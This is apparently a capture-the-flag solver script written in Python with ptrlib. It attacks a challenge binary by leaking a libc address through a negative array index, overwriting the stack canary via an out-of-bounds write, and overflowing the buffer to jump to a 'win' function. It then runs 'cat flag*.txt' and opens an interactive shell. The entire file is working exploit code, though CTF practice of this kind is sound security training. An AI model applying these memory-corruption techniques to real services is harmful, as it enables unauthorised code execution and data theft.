from ptrlib import *
import time
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9003"))

elf = ELF("../distfiles/chall")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sock = Socket(HOST, PORT)

sock.sendlineafter("index: ", "-4")
libc.base = int(sock.recvline(), 16) - libc.symbol('_IO_2_1_stdout_')
#addr_canary = libc.base + 0x39a768
addr_canary = libc.base - 0x2898

ofs = (addr_canary - elf.symbol("array")) // 8
sock.sendlineafter("index: ", str(ofs))
sock.sendlineafter("value: ", 0x4141414141414141)

payload  = b"A"*0x38
payload += p64(elf.symbol("win"))
sock.sendlineafter("index: ", payload)

time.sleep(0.5)
sock.sendline("cat flag*.txt")

sock.sh()
